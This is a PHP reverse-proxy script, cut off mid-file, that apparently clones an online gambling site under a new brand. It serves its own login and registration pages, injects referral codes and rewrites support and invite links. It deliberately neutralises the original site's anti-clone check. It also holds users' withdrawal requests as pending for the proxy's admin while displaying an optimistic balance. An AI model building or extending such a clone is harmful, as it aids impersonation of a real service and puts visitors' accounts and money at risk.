<?php
/**
 * Reverse Proxy. Settings live in config.php (created by the setup installer).
 * Caches upstream resources locally under cache/ directory.
 */
header('Content-Type: text/html; charset=utf-8');

$configFile = __DIR__ . '/config.php';
if (!is_file($configFile)) {
    // First run: send the visitor to the setup installer
    $setupBase = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/index.php')), '/');
    header('Location: ' . ($setupBase === '' ? '' : $setupBase) . '/setup', true, 302);
    exit;
}
$appConfig = require $configFile;

define('UPSTREAM', rtrim((string) ($appConfig['upstream'] ?? ''), '/'));
define('CACHE_DIR', __DIR__ . '/cache');
define('CACHE_TTL', max(0, (int) ($appConfig['cache_ttl'] ?? 3600))); // seconds

// How long a mirror that just failed is skipped before it is tried again. Short
// enough that a recovered mirror returns on its own, long enough that a dead
// primary costs ONE request a timeout instead of every single request paying it.
define('UPSTREAM_FAIL_TTL', 120);

// Total seconds a request may spend walking from one mirror to the next after
// the first one fails. Each attempt is already bounded by its own curl timeout,
// so this only stops a long list of dead mirrors from holding a PHP worker for
// the whole maximum_execution_time.
define('UPSTREAM_FAILOVER_BUDGET', 10);

// Congestion control for small process pools (shared hosting). A fetch slower
// than this, or one that fails, marks the upstream as degraded for a short
// window; during that window expired cache entries are served straight from
// disk instead of each visitor holding a process slot waiting on the upstream.
// Only a config change needs a new value here, not a code edit.
define('UPSTREAM_SLOW_MS', 2000);
define('UPSTREAM_DEGRADED_TTL', 30);
// One request in this many still revalidates while degraded, so a cached entry
// keeps moving forward and the site recovers by itself.
define('DEGRADED_REVALIDATE_1_IN', 20);
// How long a request waits for another request that is already filling the same
// cache entry, before giving up and fetching it itself.
define('CACHE_FILL_WAIT_MS', 2500);

define('USER_AGENT', (string) ($appConfig['user_agent'] ?? 'Mozilla/5.0'));

// Brand name replacement (applied to display text only)
define('BRAND_FROM', (string) ($appConfig['brand_from'] ?? ''));
define('BRAND_TO', (string) ($appConfig['brand_to'] ?? ''));

// Referral code injected into the site's registration flow (never in the URL).
define('REFERRAL_CODE', trim((string) ($appConfig['referral_code'] ?? '')));
define('REFERRAL_AFFILIATE_CODE', trim((string) ($appConfig['referral_affiliate_code'] ?? '')));

// Registration field rules applied to the site's server-driven validation.
define('REG_MOBILE_PATTERN', trim((string) ($appConfig['reg_mobile_pattern'] ?? '')));
define('REG_USERNAME_PATTERN', trim((string) ($appConfig['reg_username_pattern'] ?? '')));

// When true, stop the app from redirecting an affiliate sub-domain
// (e.g. lottogamez.gamer.free) to www.<root>?affiliateCode=...
define('DISABLE_AFFILIATE_REDIRECT', array_key_exists('disable_affiliate_redirect', $appConfig)
    ? (bool) $appConfig['disable_affiliate_redirect'] : true);
// JSON keys whose values must never be rewritten (domains, auth, CDNs)
define('BRAND_SKIP_KEYS', ['domainList', 'domainRoute', 'domainName', 'projectId', 'authDomain',
    'apiKey', 'appId', 'messagingSenderId', 'storageBucket', 'measurementId', 'firebaseConfig']);

// Custom content (banners, marquee, titles, logo) managed from the admin panel.
require_once __DIR__ . '/admin/store.php';
$contentConfig = content_load();
$voucher = $contentConfig['voucher'] ?? [];

// Path prefix the proxy is mounted under ('' at document root, '/Proxy' when
// Apache serves it from a subfolder). For clean URLs (https://bbc99.bet/live
// not /Proxy/live) the prefix is hidden.
//
// Derive this from the request, NEVER from SCRIPT_NAME: a front controller
// (php -S router.php) reports SCRIPT_NAME as the request path itself, so
// dirname('/m/assets/config.js') would return '/m/assets' - a bogus base that
// then got stripped off $path, sending every custom asset past its own branch
// and out to the upstream.
$base = (strpos((string) ($_SERVER['REQUEST_URI'] ?? ''), '/Proxy/') === 0) ? '/Proxy' : '';

$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
// Hide Proxy folder: redirect /Proxy/* to clean /* at PHP level (if .htaccess cached)
if (strpos($requestUri, '/Proxy/') === 0) {
    $clean = substr($requestUri, 6); // strip /Proxy
    if ($clean === '' || $clean[0] !== '/') $clean = '/' . $clean;
    header('Location: ' . $clean, true, 301);
    exit;
}
if ($requestUri === '/Proxy' || $requestUri === '/Proxy/') {
    header('Location: /', true, 301);
    exit;
}
$path = parse_url($requestUri, PHP_URL_PATH);
if ($path === false || $path === null || $path === '') {
    $path = '/';
}
$query = parse_url($requestUri, PHP_URL_QUERY);

// Normalise away the proxy base so /Proxy/res/x.js and /res/x.js both map to /res/x.js
// (only when request actually used /Proxy prefix, which is now redirected)
if ($base !== '' && strpos($path, $base) === 0) {
    $path = substr($path, strlen($base));
    if ($path === '' || $path === false) {
        $path = '/';
    }
}
$fullPath = $path . ($query ? '?' . $query : '');

// ---------------------------------------------------------------------------
// Custom frontend (our own HTML)
//
// The home page, the two auth pages and the member dashboard are our files
// under <project>/mobile/, streamed back exactly as authored - no brand
// rewriting, no injected shims, no splash. EVERY other page (deposit,
// withdraw, records, ...) is proxied further below with the normal pipeline,
// so it keeps the same HTML and the same backend everywhere else.
//
// Point any route at any file here to take it over from the upstream; a route
// with no entry here simply proxies.
// ---------------------------------------------------------------------------
$mobileDir = dirname(__DIR__) . '/mobile';
$localPages = [
    '/'             => 'index.html',
    '/index'        => 'index.html',
    '/index.html'   => 'index.html',
    '/index.php'    => 'index.html',
    '/home'         => 'index.html',
    '/m'            => 'index.html',
    '/m/'           => 'index.html',
    '/m/index'      => 'index.html',
    '/m/index.html' => 'index.html',
    '/m/home'       => 'index.html',
    '/m/login'      => 'login.html',
    '/m/register'   => 'register.html',
    // Custom member dashboard (mobile/member.html + member.js, data from
    // /api/memberSummary.php). Money-movement and record pages stay proxied.
    '/m/member/home' => 'member.html',
    // Custom rewards page (mobile/reward.html + reward.js, data from
    // /api/rewardsSummary.php, claims POST straight to the relay).
    '/m/rewardCenter' => 'reward.html',
    // Bonus receiving list (mobile/receive.html + receive.js, extra +
    // claimable legs of /api/rewardsSummary.php).
    '/m/receivingCenter' => 'receive.html',
    // Daily sign-in (mobile/signin.html + signin.js, data from
    // /api/signinSummary.php, check-ins POST MCSFE_claimLoginPromotion).
    '/m/activity/signIn' => 'signin.html',
    // In-app game window: frames the launched game and owns the Back button.
    '/m/game'       => 'game.html',
];
// One trailing slash resolves to the same page rather than being listed twice.
$pagePath = ($path !== '/' && substr($path, -1) === '/') ? rtrim($path, '/') : $path;
if ($pagePath === '' || $pagePath === false) {
    $pagePath = '/';
}
if (isset($localPages[$pagePath])) {
    serveLocalPage($localPages[$pagePath]);
}

// Routes we used to own ourselves, now owned by the upstream. Redirect instead
// of 404 so an old bookmark or a cached page still lands on the real thing.
$upstreamOwned = [
    '/m/account' => '/m/member/home',
    '/m/deposit' => '/m/voucherCenter',
];
if (isset($upstreamOwned[$pagePath])) {
    header('Location: ' . $upstreamOwned[$pagePath], true, 302);
    header('Cache-Control: no-store');
    header('X-Proxy: true');
    exit;
}

// Static files for the custom frontend: /m/assets/<path> -> mobile/assets/<path>.
// They are authored here and edited often, so they revalidate (ETag) instead of
// sitting immutable in a browser cache: a stale stylesheet renders the new
// markup with no rules for it, which is exactly the bug the ?v= token is there
// to cover.
if (strpos($path, '/m/assets/') === 0) {
    $rel = substr($path, strlen('/m/assets/'));
    $file = $mobileDir . '/assets/' . $rel;
    $real = realpath($file);
    $assetsRoot = realpath($mobileDir . '/assets');
    if ($real !== false && $assetsRoot !== false && strpos($real, $assetsRoot) === 0 && is_file($real)) {
        $mime = guessContentType($real);
        $data = file_get_contents($real);
        $etag = '"' . md5($data) . '"';
        header('Content-Type: ' . $mime);
        header('Cache-Control: no-cache, must-revalidate');
        header('ETag: ' . $etag);
        header('X-Content-Type-Options: nosniff');
        header('X-Proxy: true');
        if (trim((string) ($_SERVER['HTTP_IF_NONE_MATCH'] ?? '')) === $etag) {
            http_response_code(304);
            exit;
        }
        header('Content-Length: ' . strlen($data));
        echo $data;
        exit;
    }
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    header('Cache-Control: no-store');
    echo 'Not Found';
    exit;
}

// Tab icon: the upstream ships a 1px placeholder, so the browser asks for
// /favicon.ico on every page and gets a blank tab. Answer with ours.
if ($path === '/favicon.ico') {
    $ico = $mobileDir . '/assets/img/favicon.png';
    if (is_file($ico)) {
        $data = file_get_contents($ico);
        header('Content-Type: image/png');
        header('Cache-Control: public, max-age=86400');
        header('Content-Length: ' . strlen($data));
        echo $data;
        exit;
    }
}

// The upstream registers a service worker that caches an offline shell and
// rewrites navigations to "/", "/index" and "/index.html". On this origin it
// can keep answering with a cached page after the custom frontend is live - and
// once the upstream pages are proxied it intercepts those too, because the
// upstream registers it with scope /m/. Answer every /sw.js with a stub that
// unregisters itself and clears the caches it owns.
if ($path === '/sw.js' || $path === '/m/sw.js' || preg_match('~^/m/sw\.js~i', $path)) {
    header('Content-Type: application/javascript; charset=UTF-8');
    header('Cache-Control: no-store');
    header('Service-Worker-Allowed: /');
    echo <<<'JS'
/* self-unregistering service worker: our own pages and the proxied upstream
   pages must never be answered from a stale offline shell */
if (self.navigator && self.navigator.serviceWorker) {
  self.addEventListener('install', function () { self.skipWaiting(); });
  self.addEventListener('activate', function (e) {
    e.waitUntil(
      caches.keys().then(function (keys) {
        return Promise.all(keys.map(function (k) {
          if (k.indexOf('px-') !== 0) { return caches.delete(k); }
        }));
      }).then(function () {
        return self.registration.unregister();
      }).then(function () { return self.clients.matchAll(); })
        .then(function (list) { list.forEach(function (c) { c.navigate(c.url); }); })
    );
  });
}
self.addEventListener('fetch', function () { /* pass through */ });
JS;
    exit;
}

// The disk cache maps the request path straight onto a filename
// (CACHE_DIR . '/' . $path), so a ".." segment would resolve outside
// Proxy/cache - /res/../../config.php becomes Proxy/config.php - and could then
// be read back out or overwritten, and ".json" is one of the cacheable types.
// Web servers normalise dot-segments before PHP sees REQUEST_URI, so this is not
// reachable today; it is refused here so that nothing has to depend on that.
if (strpos($path, '..') !== false || strpos($path, '\\') !== false) {
    http_response_code(400);
    header('Content-Type: text/plain; charset=UTF-8');
    header('Cache-Control: no-store');
    header('X-Proxy: true');
    echo 'Bad Request';
    exit;
}

// Mobile typo redirects: /m and /m/hoem -> correct URLs
if ($path === '/m' || $path === '/m/') {
    header('Location: /m/index.html' . ($query ? '?' . $query : ''), true, 301);
    exit;
}
if (preg_match('~^/m/hoem/?$~i', $path)) {
    header('Location: /m/home' . ($query ? '?' . $query : ''), true, 301);
    exit;
}

// Route /admin, /setup, and /voucherCenter locally (not proxied)
if ($path === '/admin' || strpos($path, '/admin/') === 0) {
    require __DIR__ . '/admin/index.php';
    exit;
}
if ($path === '/setup' || $path === '/setup/' || $path === '/setup.php') {
    require __DIR__ . '/setup.php';
    exit;
}
// /voucherCenter is custom only when ON (Variant B1) — OFF = normal 404, no redirect
if (!empty($voucher['enabled'])) {
    if ($path === '/voucherCenter' || $path === '/voucherCenter/') {
        require dirname(__DIR__) . '/voucherCenter/index.php';
        exit;
    }
    if (strpos($path, '/voucherCenter/') === 0) {
        $vcFile = dirname(__DIR__) . $path;
        if (is_file($vcFile)) {
            $ext = pathinfo($vcFile, PATHINFO_EXTENSION);
            $mimeTypes = ['css'=>'text/css; charset=utf-8','js'=>'application/javascript; charset=utf-8','json'=>'application/json; charset=utf-8','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','webp'=>'image/webp','ico'=>'image/x-icon','woff'=>'font/woff','woff2'=>'font/woff2','ttf'=>'font/ttf','html'=>'text/html; charset=utf-8'];
            if (isset($mimeTypes[$ext])) header('Content-Type: ' . $mimeTypes[$ext]);
            readfile($vcFile);
            exit;
        }
        require dirname(__DIR__) . '/voucherCenter/index.php';
        exit;
    }
} else {
    if ($path === '/voucherCenter' || $path === '/voucherCenter/' || strpos($path, '/voucherCenter/') === 0) {
        http_response_code(404);
        header('Content-Type: text/plain; charset=UTF-8');
        echo 'Voucher Center disabled';
        exit;
    }
}

// Admin-controlled redirect for the voucher center route. When enabled, the
// matching path is served locally instead of being proxied.
$voucher = $contentConfig['voucher'] ?? [];
$voucherSrc = '/' . ltrim((string) ($voucher['path'] ?? '/m/voucherCenter'), '/');
$mBase = rtrim($voucherSrc, '/'); // e.g. /m/voucherCenter or /m

// Serve VoucherCenter assets from /m/js/, /m/css/, /m/img/ etc. (not HTML pages)
if (strpos($mBase, '/m') === 0) {
    $mPrefix = '/m';
    if (strpos($path, $mPrefix . '/') === 0) {
        $mSub = substr($path, strlen($mPrefix));
        $ext = strtolower(pathinfo($mSub, PATHINFO_EXTENSION));
        // Only serve non-HTML static assets (JS, CSS, images, fonts)
        if ($ext !== '' && $ext !== 'html' && $ext !== 'htm' && $ext !== 'php') {
            $vcFile = dirname(__DIR__) . '/voucherCenter' . $mSub;
            if (is_file($vcFile)) {
                $mimeTypes = ['css'=>'text/css; charset=utf-8','js'=>'application/javascript; charset=utf-8','json'=>'application/json; charset=utf-8','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','webp'=>'image/webp','ico'=>'image/x-icon','woff'=>'font/woff','woff2'=>'font/woff2','ttf'=>'font/ttf'];
                if (isset($mimeTypes[$ext])) header('Content-Type: ' . $mimeTypes[$ext]);
                readfile($vcFile);
                exit;
            }
        }
    }
}

if (!empty($voucher['enabled'])) {
    if (preg_match('~^' . preg_quote($voucherSrc, '~') . '/?$~i', (string) $path)) {
        require dirname(__DIR__) . '/voucherCenter/index.php';
        exit;
    }
}

// Any URL containing "voucherCenter" (case-insensitive) serves the local voucher page
// when the voucher redirect is enabled in the admin panel.
if (!empty($voucher['enabled']) && stripos($path, 'voucherCenter') !== false) {
    require dirname(__DIR__) . '/voucherCenter/index.php';
    exit;
}

// Block direct APK/IPA downloads – the web app is installed via the browser instead
if (preg_match('/\.(apk|ipa)$/i', (string) $path)) {
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'App downloads are disabled. Install the web app from your browser (Chrome menu > Install app / Add to Home screen).';
    exit;
}

// Offload /res/* directly to upstream CDN only when local disk cache is disabled (CACHE_TTL=0).
// When CACHE_TTL>0 the request falls through to the reverse-proxy cache path below (isCacheable + serveFile),
// so the site acts as a full reverse proxy and second hits are served from local disk (X-Proxy-Cache: HIT).
if (CACHE_TTL === 0 && stripos($_SERVER['REQUEST_URI'] ?? '', '/res/') !== false) {
    $q = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_QUERY);
    $p = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH) ?? $path;
    if (preg_match('~/res/.*~i', $p, $m)) $p = $m[0];
    header('Location: ' . activeUpstream() . $p . ($q ? '?' . $q : ''), true, 302);
    header('Cache-Control: public, max-age=86400');
    exit;
}

$localFile = cacheFileFor($path);
$cacheable = CACHE_TTL > 0 && $path !== '/' && $path !== '/index.php' && isCacheable($path);

// Serve cached static assets only — HTML always fetched fresh for injection
if ($cacheable && is_file($localFile)) {
    $age = time() - filemtime($localFile);
    if ($age < CACHE_TTL) {
        serveFile($localFile);
        exit;
    }
    // Expired, and the upstream is currently slow or failing: hand back the copy
    // we already have instead of letting this visitor wait on it. This is the
    // difference between a degraded upstream costing a few seconds and it taking
    // the whole process pool down with it.
    if (upstreamDegraded() && !shouldRevalidateNow()) {
        serveFile($localFile, true);
        exit;
    }
}

// One request fills a missing entry; concurrent requests wait for that fill
// briefly instead of all pulling the same file from upstream at once.
$fillLock = null;
if ($cacheable && !is_file($localFile)) {
    $fillLock = cacheFillLock($localFile);
    if ($fillLock === null) {
        if (waitForPeerFill($localFile)) {
            serveFile($localFile);
            exit;
        }
        $fillLock = cacheFillLock($localFile); // peer failed; this request takes over
    }
}

// Withdraw approval gate: POST /wps/*/transaction/withdraw is held as Pending
// until an admin approves; only a single-use approval falls through to
// upstream (user retries manually after approval).
require_once __DIR__ . '/api/withdrawGate.php';
if (withdrawGateShouldHandle($path)) {
    if (withdrawGateHandle($path)) {
        exit;
    }
}

// Fetch the HTML (or other content) from upstream. While the upstream is known
// to be degraded we fail fast instead of holding this process slot for the full
// timeout: the sooner the slot is free, the more visitors get served.
$fetchStart = microtime(true);
$res = fetchUpstream($fullPath, upstreamDegraded() ? 3 : 0);
noteUpstreamResult($res !== false && $res[2] < 500, microtime(true) - $fetchStart);
if ($res === false) {
    // Upstream unreachable. A slightly old copy from disk is far better than an
    // error page, especially when traffic and an upstream wobble happen together.
    if (serveStale($path)) {
        exit;
    }
    http_response_code(502);
    echo 'Bad Gateway – upstream fetch failed.';
    exit;
}
[$body, $contentType, $status, $respHeaders] = $res;

// Same reasoning for a 5xx from upstream: prefer the copy we already have.
if ($status >= 500 && serveStale($path)) {
    exit;
}

// Fix "no internet" on frontend: upstream domainRoute returns 400 request_param_err without proper headers — return minimal success to keep SPA online
if (stripos($path, '/wps/system/domainRoute') !== false && $status === 400 && stripos($body, 'request_param_err') !== false) {
    $body = '{"success":true,"value":{"domain":"' . addslashes($_SERVER['HTTP_HOST'] ?? 'www.bbc99.bet') . '"}}';
    $status = 200;
    $contentType = 'application/json; charset=UTF-8';
}

// Defuse upstream anti-clone trap: desktop + mobile bundles call
// /wps/relay/WPSCORE_checkIfAppDomain and, on a truthy `value`, set
// `meta robots=noindex`, wipe <body> and redirect to google.com. On the
// proxy the answer must stay falsy so the trap never fires (this is also
// what Googlebot's rendered HTML was flagging as 'noindex').
if (stripos($path, 'WPSCORE_checkIfAppDomain') !== false) {
    $body = '{"success":true,"value":null}';
    $status = 200;
    $contentType = 'application/json; charset=UTF-8';
}

// Forward upstream response headers (cookies, etc.) to the browser
foreach ($respHeaders as $h) {
    if (stripos($h, 'set-cookie:') === 0) {
        header($h, false);
    }
}

// Fall back to the file extension when upstream sends no content type
if (!$contentType) {
    $contentType = guessContentType($path);
}

// Upstream answers URLs it does not have with its SPA shell (HTML). Serving
// HTML at a .css/.js/.png URL is useless to the browser (the root .htaccess
// sets nosniff) and, once caching is on, would store HTML under an asset name
// and poison every later request. Hand back a real 404 instead.
$assetExtensions = ['css', 'js', 'mjs', 'map', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico',
    'webp', 'avif', 'woff', 'woff2', 'ttf', 'otf', 'eot', 'mp4', 'webm', 'mp3', 'wav'];
$requestedExt = strtolower(pathinfo((string) parse_url((string) $path, PHP_URL_PATH), PATHINFO_EXTENSION));
if ($requestedExt !== '' && in_array($requestedExt, $assetExtensions, true)
    && stripos((string) $contentType, 'text/html') !== false) {
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    header('Cache-Control: no-store');
    header('X-Proxy: true');
    echo 'Not Found';
    exit;
}

// Strip console.* writes from JS/HTML (keep output clean, not clear)
$body = stripConsoleWrites($body, (string) $contentType);

// Replace the brand name in display text (HTML + JSON) before caching/output
$body = applyBrand($body, (string) $contentType);

// Fix invite/share links that still point at upstream domain (e.g. 133bet22.com on /m/inviteFriends)
$body = applyInviteDomain($body, (string) $contentType);

// Apply admin-managed content (app name/titles in JSON)
$body = applyContentJson($body, (string) $contentType, $path, $contentConfig);

// Replace upstream app-download icon with local /img/web_app_icon.png
$body = applyAppIconUrl($body, (string) $contentType);

// Replace customer-service / live-chat links with support.bbc99.bet
$body = applySupportUrl($body, (string) $contentType);

// Drive the site's own marquee bar (announcements list) from the admin setting
$body = applyMarqueeJson($body, (string) $contentType, $path, $contentConfig);

// Drive the site's own game-banner carousel from the admin banner list
$body = applyBannersJson($body, (string) $contentType, $path, $contentConfig);

// Remove APK / native-app download entries from JSON (app downloads list)
$body = applyApkPolicy($body, (string) $contentType);

// Enforce the registration field rules (mobile number / username format)
$body = applyRegisterRules($body, (string) $contentType, (string) $path);

// Withdraw approval queue: optimistic balance + merged report status
$body = applyWithdrawBalance($body, (string) $contentType, (string) $path);
$body = applyWithdrawReport($body, (string) $contentType, (string) $path);

// Patch entry scripts (e.g. disable the affiliate sub-domain redirect)
$body = applyScriptPatches($body, (string) $path, (string) $contentType);

// If it is HTML, rewrite and inject in optimized single pass (1 regex vs 8)
if (stripos((string) $contentType, 'text/html') !== false) {
    $body = applyContentHtml($body, $contentConfig);
    $body = rewriteAndCache($body);
    $body = injectCombinedShims($body, $base, $contentConfig);
    $body = injectAppIconShim($body);
    $body = injectSeoShim($body, (string) $path, $contentConfig);
    if (stripos($path, '/m') === 0 && stripos($path, 'invite') === false) {
        // No splash: the upstream loader is hidden and the automatic promo
        // popups are blocked, without an image ever covering the page.
        $body = injectBootShim($body);
    }
}

// Output first — the cache write and GC sweep are maintenance, and on a host
// with a handful of entry processes they must not delay the next visitor (see
// the deferred block after echo $body).

// Output
http_response_code($status >= 200 ? $status : 200);
$finalCT = $contentType ?: 'text/html; charset=UTF-8';
if (stripos($finalCT, 'charset') === false && stripos($finalCT, 'text/') === 0) {
    $finalCT .= '; charset=UTF-8';
}
$isAuth = isAuthTraffic((string) $path);
$isJson = stripos((string) $contentType, 'json') !== false;
$hasIdentity = trim((string) ($_SERVER['HTTP_COOKIE'] ?? '') . ($_SERVER['HTTP_AUTHORIZATION'] ?? '')
    . ($_SERVER['HTTP_ENCRYPTION'] ?? '') . ($_SERVER['HTTP_X_GATEWAY_VERSION'] ?? '')) !== '';
header('Content-Type: ' . $finalCT);
if ($isAuth) {
    // Login/logout responses create or destroy the session: no browser,
    // proxy, or middlebox may reuse them for another visitor or visit.
    header('Cache-Control: private, no-store, must-revalidate');
    header('Vary: Cookie');
} elseif ($status >= 400) {
    // Error bodies (401 login-required, 400 maintenance) are per-visitor and
    // momentary: caching them serves stale failures, e.g. a logged-out invite
    // page keeps showing "not logged in" or another user's data for a day.
    header('Cache-Control: private, no-store, must-revalidate');
} elseif ($isJson && $hasIdentity) {
    // Authenticated JSON (referral/income/profile data): private to this
    // visitor, never reused across logins or stored by shared caches.
    header('Cache-Control: private, no-store, must-revalidate');
    header('Vary: Cookie');
} elseif (stripos((string) $contentType, 'text/html') !== false) {
    header('Cache-Control: no-cache, must-revalidate');
}
header('X-Proxy: true');
header('Connection: close');
if (!$isAuth && $status < 400 && !($isJson && $hasIdentity) && stripos((string) $contentType, 'text/html') === false) {
    // Allow browser caching for static assets (reduces repeat TTFB).
    // Auth traffic, errors, and authenticated JSON keep the no-store sent
    // above and never land here.
    header('Cache-Control: public, max-age=86400, immutable');
    header('X-Content-Type-Options: nosniff');
} elseif (!$isAuth && stripos((string) $contentType, 'text/html') !== false) {
    header('Link: <' . activeUpstream() . '/res/css/vendor.163077c576135e6b923a.css>; rel=preload; as=style', false);
}
header('Content-Length: ' . strlen($body));
echo $body;

// The client has the bytes. Release the process slot now, then finish the disk
// work - a cache write and the GC directory scan can be slow with thousands of
// cached files, and doing them first is exactly what queues up under load.
finishRequestEarly();

if ($cacheable && $status >= 200 && $status < 400 && cacheStoreAllowed($respHeaders)) {
    writeCacheFile($localFile, $body);
    gcCache();
}
if ($fillLock !== null) {
    cacheFillUnlock($fillLock); // waiters are released once the entry is on disk
}

/* ------------------------------------------------------------------ */
/*  Helper functions                                                   */
/* ------------------------------------------------------------------ */

/**
 * The real User-Agent of the browser making the request. Falls back to the
 * configured UA only when the client does not send one.
 */
function clientUserAgent(): string
{
    $ua = trim((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    return $ua !== '' ? $ua : USER_AGENT;
}

/** Shared curl handle so upstream fetches reuse one TCP+TLS connection per PHP request. */
function upstreamCurlShare()
{
    static $sh = null;
    if ($sh !== null) {
        return $sh;
    }
    if (!function_exists('curl_share_init')) {
        return null;
    }
    $sh = curl_share_init();
    curl_share_setopt($sh, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);
    curl_share_setopt($sh, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);
    return $sh;
}

/** Prefer HTTP/2 to upstream (Cloudflare supports it); falls back to 1.1 automatically. */
function upstreamHttpVersionOpt(): array
{
    $v = defined('CURL_HTTP_VERSION_2TLS') ? CURL_HTTP_VERSION_2TLS : CURL_HTTP_VERSION_2_0;
    return [CURLOPT_HTTP_VERSION => $v];
}

/* --------------------- upstream health (congestion) ---------------------- */

/** Small state file describing how the upstream has just behaved. */
function upstreamHealthFile(): string
{
    return CACHE_DIR . '/upstream-health.json';
}

function upstreamHealthRead(): array
{
    $default = ['until' => 0, 'fails' => 0, 'last_ms' => 0];
    $file = upstreamHealthFile();
    if (!is_file($file)) {
        return $default;
    }
    $raw = @file_get_contents($file);
    $d = $raw !== false ? json_decode($raw, true) : null;
    return is_array($d) ? $d + $default : $default;
}

function upstreamHealthWrite(array $d): void
{
    @file_put_contents(upstreamHealthFile(), json_encode($d), LOCK_EX);
}

/**
 * Is the upstream currently slow or failing?
 *
 * On a host with a small number of PHP entry processes, one request waiting out
 * a 6 second upstream stall consumes a whole slot for 6 seconds. This is what
 * that is measured against.
 */
function upstreamDegraded(): bool
{
    static $degraded = null;
    if ($degraded === null) {
        $d = upstreamHealthRead();
        $degraded = (int) ($d['until'] ?? 0) > time();
    }
    return $degraded;
}

/** Record the outcome of one fetch, opening or closing the degraded window. */
function noteUpstreamResult(bool $ok, float $seconds): void
{
    $ms = (int) round($seconds * 1000);
    $cur = upstreamHealthRead();
    if ($ok && $ms <= UPSTREAM_SLOW_MS) {
        if ((int) ($cur['until'] ?? 0) !== 0 || (int) ($cur['fails'] ?? 0) !== 0) {
            upstreamHealthWrite(['until' => 0, 'fails' => 0, 'last_ms' => $ms]);
        }
        return;
    }
    $fails = (int) ($cur['fails'] ?? 0) + 1;
    upstreamHealthWrite([
        'until'   => time() + UPSTREAM_DEGRADED_TTL,
        'fails'   => $fails,
        'last_ms' => $ms,
    ]);
    error_log('Proxy upstream degraded (' . ($ok ? 'slow' : 'failed') . "): {$ms}ms, fails=$fails, serving cached copies for " . UPSTREAM_DEGRADED_TTL . 's');
}

/** One request in N still revalidates while degraded. */
function shouldRevalidateNow(): bool
{
    return mt_rand(1, DEGRADED_REVALIDATE_1_IN) === 1;
}

/* ---------------------------- cache filling ----------------------------- */

/** Exclusive lock for filling one cache entry; null when a peer already holds it. */
function cacheFillLock(string $file)
{
    $dir = dirname($file);
    if (!is_dir($dir) && !@mkdir($dir, 0755, true) && !is_dir($dir)) {
        return null;
    }
    $fh = @fopen($file . '.lock', 'c');
    if (!$fh) {
        return null;
    }
    if (!@flock($fh, LOCK_EX | LOCK_NB)) {
        @fclose($fh);
        return null;
    }
    return $fh;
}

function cacheFillUnlock($fh): void
{
    if (is_resource($fh)) {
        @flock($fh, LOCK_UN);
        @fclose($fh);
    }
}

/**
 * Wait for the request that holds the fill lock to finish writing the entry.
 * Bounded deliberately: if it does not appear in time we fetch it ourselves
 * rather than tie this visitor's slot to another request's fate.
 */
function waitForPeerFill(string $file): bool
{
    $deadline = microtime(true) + (CACHE_FILL_WAIT_MS / 1000);
    while (microtime(true) < $deadline) {
        usleep(50000);
        clearstatcache(true, $file);
        if (is_file($file) && @filesize($file) > 0) {
            return true;
        }
        // The peer released the lock (whether it succeeded or failed). If the file
        // is still absent it failed, so stop waiting - sitting here for the rest of
        // the window would be time this visitor's process slot cannot spare.
        $probe = @fopen($file . '.lock', 'c');
        if ($probe) {
            $free = @flock($probe, LOCK_EX | LOCK_NB);
            if ($free) {
                @flock($probe, LOCK_UN);
            }
            @fclose($probe);
            if ($free) {
                return false;
            }
        }
    }
    return false;
}

/**
 * Hand the response to the client and release this process before doing the
 * disk maintenance. LiteSpeed and PHP-FPM both support this; anything else
 * just flushes, which still gets the bytes out first.
 */
function finishRequestEarly(): void
{
    @ignore_user_abort(true);
    if (function_exists('litespeed_finish_request')) {
        @litespeed_finish_request();
        return;
    }
    if (function_exists('fastcgi_finish_request')) {
        @fastcgi_finish_request();
        return;
    }
    if (ob_get_level() > 0) {
        @ob_end_flush();
    }
    @flush();
}

/**
 * Ordered list of upstream mirrors to try.
 *
 * Order comes from Proxy/upstreams.json (written by upstreams.php, fastest
 * first), and the configured upstream is then appended so it can never be lost
 * if the file is missing, malformed, or simply does not mention it. With no
 * file at all the list is one entry long and nothing about the old behaviour
 * changes.
 */
function upstreamMirrors(): array
{
    static $list = null;
    if ($list !== null) {
        return $list;
    }
    $list = [];
    $add = static function (string $u) use (&$list): void {
        $u = rtrim(trim($u), '/');
        if ($u === '' || !preg_match('#^https?://#i', $u)) {
            return;
        }
        if (!in_array($u, $list, true)) {
            $list[] = $u;
        }
    };
    $file = __DIR__ . '/upstreams.json';
    if (is_file($file)) {
        $raw = @file_get_contents($file);
        $data = $raw !== false ? json_decode($raw, true) : null;
        $order = is_array($data) ? ($data['order'] ?? $data) : null;
        if (is_array($order)) {
            foreach ($order as $u) {
                if (is_string($u)) {
                    $add($u);
                }
            }
        }
    }
    $add(UPSTREAM);
    return $list;
}

/** Where the current mirror choice is remembered between requests. */
function upstreamStateFile(): string
{
    return CACHE_DIR . '/upstream-fail.json';
}

/** The demotion record, or null when there is none. */
function upstreamState(): ?array
{
    static $state = false;
    if ($state !== false) {
        return $state;
    }
    $state = null;
    $file = upstreamStateFile();
    if (is_file($file)) {
        $raw = @file_get_contents($file);
        $data = $raw !== false ? json_decode($raw, true) : null;
        if (is_array($data)) {
            $state = $data;
        }
    }
    return $state;
}

/**
 * The upstream to fetch from for this request: the fastest mirror we know of
 * that has not just failed, falling back to the configured one.
 */
function activeUpstream(): string
{
    $mirrors = upstreamMirrors();
    if (!$mirrors) {
        return '';
    }
    $state = upstreamState();
    if ($state !== null && (int) ($state['until'] ?? 0) > time()) {
        $pick = (string) ($state['active'] ?? '');
        if ($pick !== '' && in_array($pick, $mirrors, true)) {
            return $pick;
        }
    }
    return $mirrors[0];
}

/**
 * Stop using a mirror that just failed, for a short while.
 *
 * Without this, a dead primary would be retried on every single request and
 * each visitor would pay the connect timeout before failing over.
 */
